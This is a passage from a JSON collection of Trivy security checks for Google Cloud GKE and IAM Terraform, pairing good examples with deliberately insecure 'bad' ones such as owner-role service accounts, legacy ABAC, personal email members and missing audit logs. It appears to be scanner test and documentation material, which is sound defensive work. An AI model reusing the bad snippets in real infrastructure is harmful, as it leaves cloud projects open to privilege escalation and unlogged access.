              "resource \"google_container_cluster\" \"good_example\" {\n  enable_shielded_nodes = \"true\"\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  enable_shielded_nodes = \"false\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-USE_CLUSTER_LABELS",
        "title": "Use Cluster Labels",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#resource_labels\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n        resource_labels = {\n          \"env\" = \"staging\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        name     = \"my-gke-cluster\"\n        location = \"us-central1\"\n      }\n",
        "file_name": "use_cluster_labels.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/use_cluster_labels.yaml",
        "local_path": "google/gke/use_cluster_labels.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#resource_labels"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n  resource_labels = {\n    \"env\" = \"staging\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  name     = \"my-gke-cluster\"\n  location = \"us-central1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-USE_RBAC_PERMISSIONS",
        "title": "Use Rbac Permissions",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_legacy_abac\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        # enable_legacy_abac not set\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        enable_legacy_abac = true\n      }\n",
        "file_name": "use_rbac_permissions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/use_rbac_permissions.yaml",
        "local_path": "google/gke/use_rbac_permissions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_legacy_abac"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  # enable_legacy_abac not set\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  enable_legacy_abac = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-GKE-USE_SERVICE_ACCOUNT",
        "title": "Use Service Account",
        "provider": "google",
        "service": "gke",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#service_account\n  good:\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        node_config {\n          service_account = \"cool-service-account@example.com\"\n        }\n      }\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        cluster_autoscaling {\n          enabled = true\n          auto_provisioning_defaults {\n            service_account = \"cool-service-account@example.com\"\n          }\n        }\n      }\n    - |-\n      resource \"google_container_cluster\" \"good_example\" {\n        enable_autopilot = true\n        cluster_autoscaling {\n          auto_provisioning_defaults {\n            service_account = \"cool-service-account@example.com\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        node_config {\n          # service_account not specified\n        }\n      }\n    - |-\n      resource \"google_container_cluster\" \"bad_example\" {\n        cluster_autoscaling {\n          enabled = true\n          auto_provisioning_defaults {\n            # service_account not specified\n          }\n        }\n      }\n",
        "file_name": "use_service_account.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/gke/use_service_account.yaml",
        "local_path": "google/gke/use_service_account.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#service_account"
            ],
            "good": [
              "resource \"google_container_cluster\" \"good_example\" {\n  node_config {\n    service_account = \"cool-service-account@example.com\"\n  }\n}",
              "resource \"google_container_cluster\" \"good_example\" {\n  cluster_autoscaling {\n    enabled = true\n    auto_provisioning_defaults {\n      service_account = \"cool-service-account@example.com\"\n    }\n  }\n}",
              "resource \"google_container_cluster\" \"good_example\" {\n  enable_autopilot = true\n  cluster_autoscaling {\n    auto_provisioning_defaults {\n      service_account = \"cool-service-account@example.com\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_container_cluster\" \"bad_example\" {\n  node_config {\n    # service_account not specified\n  }\n}",
              "resource \"google_container_cluster\" \"bad_example\" {\n  cluster_autoscaling {\n    enabled = true\n    auto_provisioning_defaults {\n      # service_account not specified\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-CONFIGURE_AUDIT_LOGGING",
        "title": "Configure Audit Logging",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam#google_project_iam_audit_config\n  good:\n    - |-\n      resource \"google_project_iam_audit_config\" \"config\" {\n        project = \"your-project-id\"\n        service = \"allServices\"\n        audit_log_config {\n          log_type = \"ADMIN_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_WRITE\"\n        }\n      }\n    - |-\n      resource \"google_project_iam_audit_config\" \"config\" {\n        project = \"your-project-id\"\n        service = \"allServices\"\n        audit_log_config {\n          log_type = \"ADMIN_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_WRITE\"\n          exempted_members = [\n            \"serviceAccount:specific-service@project.iam.gserviceaccount.com\",\n          ]\n        }\n      }\n  bad:\n    - |-\n      # No audit configuration - will fail the check\n      resource \"google_project\" \"project\" {\n        name       = \"My Project\"\n        project_id = \"your-project-id\"\n      }\n    - |-\n      resource \"google_project\" \"test\" {\n        name       = \"My Project\"\n        project_id = \"your-project-id\"\n      }\n\n      # Missing required log types\n      resource \"google_project_iam_audit_config\" \"config\" {\n        project = google_project.test.id\n        service = \"allServices\"\n        audit_log_config {\n          log_type = \"ADMIN_READ\"\n        }\n        # Missing DATA_READ and DATA_WRITE\n      }\n    - |-\n      resource \"google_project\" \"test\" {\n        name       = \"My Project\"\n        project_id = \"your-project-id\"\n      }\n\n      # Service scope too limited\n      resource \"google_project_iam_audit_config\" \"config\" {\n        project = google_project.test.id\n        service = \"cloudresourcemanager.googleapis.com\" # Should be \"allServices\"\n        audit_log_config {\n          log_type = \"ADMIN_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_READ\"\n        }\n        audit_log_config {\n          log_type = \"DATA_WRITE\"\n        }\n      }\n",
        "file_name": "configure_audit_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/configure_audit_logging.yaml",
        "local_path": "google/iam/configure_audit_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam#google_project_iam_audit_config"
            ],
            "good": [
              "resource \"google_project_iam_audit_config\" \"config\" {\n  project = \"your-project-id\"\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_WRITE\"\n  }\n}",
              "resource \"google_project_iam_audit_config\" \"config\" {\n  project = \"your-project-id\"\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_WRITE\"\n    exempted_members = [\n      \"serviceAccount:specific-service@project.iam.gserviceaccount.com\",\n    ]\n  }\n}"
            ],
            "bad": [
              "# No audit configuration - will fail the check\nresource \"google_project\" \"project\" {\n  name       = \"My Project\"\n  project_id = \"your-project-id\"\n}",
              "resource \"google_project\" \"test\" {\n  name       = \"My Project\"\n  project_id = \"your-project-id\"\n}\n\n# Missing required log types\nresource \"google_project_iam_audit_config\" \"config\" {\n  project = google_project.test.id\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  # Missing DATA_READ and DATA_WRITE\n}",
              "resource \"google_project\" \"test\" {\n  name       = \"My Project\"\n  project_id = \"your-project-id\"\n}\n\n# Service scope too limited\nresource \"google_project_iam_audit_config\" \"config\" {\n  project = google_project.test.id\n  service = \"cloudresourcemanager.googleapis.com\" # Should be \"allServices\"\n  audit_log_config {\n    log_type = \"ADMIN_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n  audit_log_config {\n    log_type = \"DATA_WRITE\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_CONDITIONS_ON_WORKLOAD_IDENTITY_POOL_PROVIDER",
        "title": "No Conditions On Workload Identity Pool Provider",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/iam_workload_identity_pool_provider#attribute_condition\n  good:\n    - |-\n      resource \"google_iam_workload_identity_pool\" \"github\" {\n        provider                  = google\n        project                   = data.google_project.project.project_id\n        workload_identity_pool_id = \"github\"\n      }\n\n      resource \"google_iam_workload_identity_pool_provider\" \"github\" {\n        provider                           = google\n        project                            = data.google_project.project.project_id\n        workload_identity_pool_id          = google_iam_workload_identity_pool.github-actions[0].workload_identity_pool_id\n        workload_identity_pool_provider_id = \"github\"\n\n        attribute_condition = \"assertion.repository_owner=='your-github-organization'\"\n      }\n  bad:\n    - |-\n      resource \"google_iam_workload_identity_pool\" \"github\" {\n        provider                  = google\n        project                   = data.google_project.project.project_id\n        workload_identity_pool_id = \"github\"\n      }\n\n      resource \"google_iam_workload_identity_pool_provider\" \"github\" {\n        provider                           = google\n        project                            = data.google_project.project.project_id\n        workload_identity_pool_id          = google_iam_workload_identity_pool.github-actions[0].workload_identity_pool_id\n        workload_identity_pool_provider_id = \"github\"\n      }\n",
        "file_name": "no_conditions_on_workload_identity_pool_provider.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_conditions_on_workload_identity_pool_provider.yaml",
        "local_path": "google/iam/no_conditions_on_workload_identity_pool_provider.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/iam_workload_identity_pool_provider#attribute_condition"
            ],
            "good": [
              "resource \"google_iam_workload_identity_pool\" \"github\" {\n  provider                  = google\n  project                   = data.google_project.project.project_id\n  workload_identity_pool_id = \"github\"\n}\n\nresource \"google_iam_workload_identity_pool_provider\" \"github\" {\n  provider                           = google\n  project                            = data.google_project.project.project_id\n  workload_identity_pool_id          = google_iam_workload_identity_pool.github-actions[0].workload_identity_pool_id\n  workload_identity_pool_provider_id = \"github\"\n\n  attribute_condition = \"assertion.repository_owner=='your-github-organization'\"\n}"
            ],
            "bad": [
              "resource \"google_iam_workload_identity_pool\" \"github\" {\n  provider                  = google\n  project                   = data.google_project.project.project_id\n  workload_identity_pool_id = \"github\"\n}\n\nresource \"google_iam_workload_identity_pool_provider\" \"github\" {\n  provider                           = google\n  project                            = data.google_project.project.project_id\n  workload_identity_pool_id          = google_iam_workload_identity_pool.github-actions[0].workload_identity_pool_id\n  workload_identity_pool_provider_id = \"github\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_DEFAULT_NETWORK",
        "title": "No Default Network",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project#auto_create_network\n  good:\n    - |-\n      resource \"google_project\" \"good_example\" {\n        name                = \"My Project\"\n        project_id          = \"your-project-id\"\n        org_id              = \"1234567\"\n        auto_create_network = false\n      }\n  bad:\n    - |-\n      resource \"google_project\" \"bad_example\" {\n        name                = \"My Project\"\n        project_id          = \"your-project-id\"\n        org_id              = \"1234567\"\n        auto_create_network = true\n      }\n",
        "file_name": "no_default_network.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_default_network.yaml",
        "local_path": "google/iam/no_default_network.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project#auto_create_network"
            ],
            "good": [
              "resource \"google_project\" \"good_example\" {\n  name                = \"My Project\"\n  project_id          = \"your-project-id\"\n  org_id              = \"1234567\"\n  auto_create_network = false\n}"
            ],
            "bad": [
              "resource \"google_project\" \"bad_example\" {\n  name                = \"My Project\"\n  project_id          = \"your-project-id\"\n  org_id              = \"1234567\"\n  auto_create_network = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_FOLDER_LEVEL_DEFAULT_SERVICE_ACCOUNT_ASSIGNMENT",
        "title": "No Folder Level Default Service Account Assignment",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam\n  good:\n    - |-\n      resource \"google_service_account\" \"test\" {\n        account_id   = \"account123\"\n        display_name = \"account123\"\n      }\n\n      resource \"google_folder_iam_member\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/whatever\"\n        member = \"serviceAccount:${google_service_account.test.email}\"\n      }\n  bad:\n    - |-\n      resource \"google_folder_iam_member\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/whatever\"\n        member = \"123-compute@developer.gserviceaccount.com\"\n      }\n    - |-\n      resource \"google_folder_iam_member\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/whatever\"\n        member = \"123@appspot.gserviceaccount.com\"\n      }\n    - |-\n      data \"google_compute_default_service_account\" \"default\" {\n      }\n\n      resource \"google_folder_iam_member\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/whatever\"\n        member = data.google_compute_default_service_account.default.id\n      }\n",
        "file_name": "no_folder_level_default_service_account_assignment.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_folder_level_default_service_account_assignment.yaml",
        "local_path": "google/iam/no_folder_level_default_service_account_assignment.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam"
            ],
            "good": [
              "resource \"google_service_account\" \"test\" {\n  account_id   = \"account123\"\n  display_name = \"account123\"\n}\n\nresource \"google_folder_iam_member\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/whatever\"\n  member = \"serviceAccount:${google_service_account.test.email}\"\n}"
            ],
            "bad": [
              "resource \"google_folder_iam_member\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/whatever\"\n  member = \"123-compute@developer.gserviceaccount.com\"\n}",
              "resource \"google_folder_iam_member\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/whatever\"\n  member = \"123@appspot.gserviceaccount.com\"\n}",
              "data \"google_compute_default_service_account\" \"default\" {\n}\n\nresource \"google_folder_iam_member\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/whatever\"\n  member = data.google_compute_default_service_account.default.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_FOLDER_LEVEL_SERVICE_ACCOUNT_IMPERSONATION",
        "title": "No Folder Level Service Account Impersonation",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam\n  good:\n    - |-\n      resource \"google_folder_iam_binding\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/nothingInParticular\"\n      }\n  bad:\n    - |-\n      resource \"google_folder_iam_binding\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/iam.serviceAccountUser\"\n      }\n    - |-\n      resource \"google_folder_iam_binding\" \"folder-123\" {\n        folder = \"folder-123\"\n        role   = \"roles/iam.serviceAccountTokenCreator\"\n      }\n",
        "file_name": "no_folder_level_service_account_impersonation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_folder_level_service_account_impersonation.yaml",
        "local_path": "google/iam/no_folder_level_service_account_impersonation.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam"
            ],
            "good": [
              "resource \"google_folder_iam_binding\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/nothingInParticular\"\n}"
            ],
            "bad": [
              "resource \"google_folder_iam_binding\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/iam.serviceAccountUser\"\n}",
              "resource \"google_folder_iam_binding\" \"folder-123\" {\n  folder = \"folder-123\"\n  role   = \"roles/iam.serviceAccountTokenCreator\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_ORG_LEVEL_DEFAULT_SERVICE_ACCOUNT_ASSIGNMENT",
        "title": "No Org Level Default Service Account Assignment",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam\n  good:\n    - |-\n      resource \"google_service_account\" \"test\" {\n        account_id   = \"account123\"\n        display_name = \"account123\"\n      }\n\n      resource \"google_organization_iam_member\" \"org-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/whatever\"\n        member = \"serviceAccount:${google_service_account.test.email}\"\n      }\n  bad:\n    - |-\n      resource \"google_organization_iam_member\" \"org-123\" {\n        org_id = \"organization-123\"\n        role   = \"roles/whatever\"\n        member = \"123-compute@developer.gserviceaccount.com\"\n      }\n    - |-\n      resource \"google_organization_iam_member\" \"org-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/whatever\"\n        member = \"123@appspot.gserviceaccount.com\"\n      }\n    - |-\n      data \"google_compute_default_service_account\" \"default\" {\n      }\n\n      resource \"google_organization_iam_member\" \"org-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/whatever\"\n        member = data.google_compute_default_service_account.default.id\n      }\n",
        "file_name": "no_org_level_default_service_account_assignment.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_org_level_default_service_account_assignment.yaml",
        "local_path": "google/iam/no_org_level_default_service_account_assignment.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam"
            ],
            "good": [
              "resource \"google_service_account\" \"test\" {\n  account_id   = \"account123\"\n  display_name = \"account123\"\n}\n\nresource \"google_organization_iam_member\" \"org-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/whatever\"\n  member = \"serviceAccount:${google_service_account.test.email}\"\n}"
            ],
            "bad": [
              "resource \"google_organization_iam_member\" \"org-123\" {\n  org_id = \"organization-123\"\n  role   = \"roles/whatever\"\n  member = \"123-compute@developer.gserviceaccount.com\"\n}",
              "resource \"google_organization_iam_member\" \"org-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/whatever\"\n  member = \"123@appspot.gserviceaccount.com\"\n}",
              "data \"google_compute_default_service_account\" \"default\" {\n}\n\nresource \"google_organization_iam_member\" \"org-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/whatever\"\n  member = data.google_compute_default_service_account.default.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_ORG_LEVEL_SERVICE_ACCOUNT_IMPERSONATION",
        "title": "No Org Level Service Account Impersonation",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam\n  good:\n    - |-\n      resource \"google_organization_iam_binding\" \"organization-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/nothingInParticular\"\n      }\n  bad:\n    - |-\n      resource \"google_organization_iam_binding\" \"organization-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/iam.serviceAccountUser\"\n      }\n    - |-\n      resource \"google_organization_iam_binding\" \"organization-123\" {\n        org_id = \"org-123\"\n        role   = \"roles/iam.serviceAccountTokenCreator\"\n      }\n",
        "file_name": "no_org_level_service_account_impersonation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_org_level_service_account_impersonation.yaml",
        "local_path": "google/iam/no_org_level_service_account_impersonation.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam"
            ],
            "good": [
              "resource \"google_organization_iam_binding\" \"organization-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/nothingInParticular\"\n}"
            ],
            "bad": [
              "resource \"google_organization_iam_binding\" \"organization-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/iam.serviceAccountUser\"\n}",
              "resource \"google_organization_iam_binding\" \"organization-123\" {\n  org_id = \"org-123\"\n  role   = \"roles/iam.serviceAccountTokenCreator\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_PERSONAL_EMAILS",
        "title": "No Personal Emails",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam#google_project_iam_binding\n  good:\n    - |-\n      resource \"google_project_iam_binding\" \"good_example\" {\n        members = [\n          \"user:employee@company.com\",\n          \"serviceAccount:service@company.iam.gserviceaccount.com\",\n        ]\n      }\n    - |-\n      resource \"google_project_iam_member\" \"good_example\" {\n        member = \"user:admin@organization.com\"\n      }\n  bad:\n    - |-\n      resource \"google_project_iam_binding\" \"bad_example\" {\n        members = [\n          \"user:personal@gmail.com\",\n          \"user:someone@hotmail.com\",\n        ]\n      }\n    - |-\n      resource \"google_project_iam_member\" \"bad_example\" {\n        member = \"user:temp@yahoo.com\"\n      }\n",
        "file_name": "no_personal_emails.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_personal_emails.yaml",
        "local_path": "google/iam/no_personal_emails.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam#google_project_iam_binding"
            ],
            "good": [
              "resource \"google_project_iam_binding\" \"good_example\" {\n  members = [\n    \"user:employee@company.com\",\n    \"serviceAccount:service@company.iam.gserviceaccount.com\",\n  ]\n}",
              "resource \"google_project_iam_member\" \"good_example\" {\n  member = \"user:admin@organization.com\"\n}"
            ],
            "bad": [
              "resource \"google_project_iam_binding\" \"bad_example\" {\n  members = [\n    \"user:personal@gmail.com\",\n    \"user:someone@hotmail.com\",\n  ]\n}",
              "resource \"google_project_iam_member\" \"bad_example\" {\n  member = \"user:temp@yahoo.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_PRIVILEGED_SERVICE_ACCOUNTS",
        "title": "No Privileged Service Accounts",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam\n  good:\n    - |-\n      resource \"google_service_account\" \"test\" {\n        account_id   = \"account123\"\n        display_name = \"account123\"\n        email        = \"jim@tfsec.dev\"\n      }\n\n      resource \"google_project_iam_member\" \"project\" {\n        project = \"your-project-id\"\n        role    = \"roles/logging.logWriter\"\n        member  = \"serviceAccount:${google_service_account.test.email}\"\n      }\n  bad:\n    - |-\n      resource \"google_service_account\" \"test\" {\n        account_id   = \"account123\"\n        display_name = \"account123\"\n        email        = \"jim@tfsec.dev\"\n      }\n\n      resource \"google_project_iam_member\" \"project\" {\n        project = \"your-project-id\"\n        role    = \"roles/owner\"\n        member  = \"serviceAccount:${google_service_account.test.email}\"\n      }\n",
        "file_name": "no_privileged_service_accounts.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_privileged_service_accounts.yaml",
        "local_path": "google/iam/no_privileged_service_accounts.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam"
            ],
            "good": [
              "resource \"google_service_account\" \"test\" {\n  account_id   = \"account123\"\n  display_name = \"account123\"\n  email        = \"jim@tfsec.dev\"\n}\n\nresource \"google_project_iam_member\" \"project\" {\n  project = \"your-project-id\"\n  role    = \"roles/logging.logWriter\"\n  member  = \"serviceAccount:${google_service_account.test.email}\"\n}"
            ],
            "bad": [
              "resource \"google_service_account\" \"test\" {\n  account_id   = \"account123\"\n  display_name = \"account123\"\n  email        = \"jim@tfsec.dev\"\n}\n\nresource \"google_project_iam_member\" \"project\" {\n  project = \"your-project-id\"\n  role    = \"roles/owner\"\n  member  = \"serviceAccount:${google_service_account.test.email}\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_PROJECT_LEVEL_DEFAULT_SERVICE_ACCOUNT_ASSIGNMENT",
        "title": "No Project Level Default Service Account Assignment",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam\n  good:\n    - |-\n      resource \"google_service_account\" \"test\" {\n        account_id   = \"account123\"\n        display_name = \"account123\"\n      }\n\n      resource \"google_project_iam_member\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/whatever\"\n        member  = \"serviceAccount:${google_service_account.test.email}\"\n      }\n  bad:\n    - |-\n      resource \"google_project_iam_member\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/whatever\"\n        member  = \"123-compute@developer.gserviceaccount.com\"\n      }\n    - |-\n      resource \"google_project_iam_member\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/whatever\"\n        member  = \"123@appspot.gserviceaccount.com\"\n      }\n    - |-\n      data \"google_compute_default_service_account\" \"default\" {\n      }\n\n      resource \"google_project_iam_member\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/whatever\"\n        member  = data.google_compute_default_service_account.default.id\n      }\n",
        "file_name": "no_project_level_default_service_account_assignment.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_project_level_default_service_account_assignment.yaml",
        "local_path": "google/iam/no_project_level_default_service_account_assignment.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam"
            ],
            "good": [
              "resource \"google_service_account\" \"test\" {\n  account_id   = \"account123\"\n  display_name = \"account123\"\n}\n\nresource \"google_project_iam_member\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/whatever\"\n  member  = \"serviceAccount:${google_service_account.test.email}\"\n}"
            ],
            "bad": [
              "resource \"google_project_iam_member\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/whatever\"\n  member  = \"123-compute@developer.gserviceaccount.com\"\n}",
              "resource \"google_project_iam_member\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/whatever\"\n  member  = \"123@appspot.gserviceaccount.com\"\n}",
              "data \"google_compute_default_service_account\" \"default\" {\n}\n\nresource \"google_project_iam_member\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/whatever\"\n  member  = data.google_compute_default_service_account.default.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-IAM-NO_PROJECT_LEVEL_SERVICE_ACCOUNT_IMPERSONATION",
        "title": "No Project Level Service Account Impersonation",
        "provider": "google",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam\n  good:\n    - |-\n      resource \"google_project_iam_binding\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/nothingInParticular\"\n      }\n  bad:\n    - |-\n      resource \"google_project_iam_binding\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/iam.serviceAccountUser\"\n      }\n    - |-\n      resource \"google_project_iam_binding\" \"project-123\" {\n        project = \"project-123\"\n        role    = \"roles/iam.serviceAccountTokenCreator\"\n      }\n",
        "file_name": "no_project_level_service_account_impersonation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/iam/no_project_level_service_account_impersonation.yaml",
        "local_path": "google/iam/no_project_level_service_account_impersonation.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam"
            ],
            "good": [
              "resource \"google_project_iam_binding\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/nothingInParticular\"\n}"
            ],
            "bad": [
              "resource \"google_project_iam_binding\" \"project-123\" {\n  project = \"project-123\"\n  role    = \"roles/iam.serviceAccountUser\"\n}",
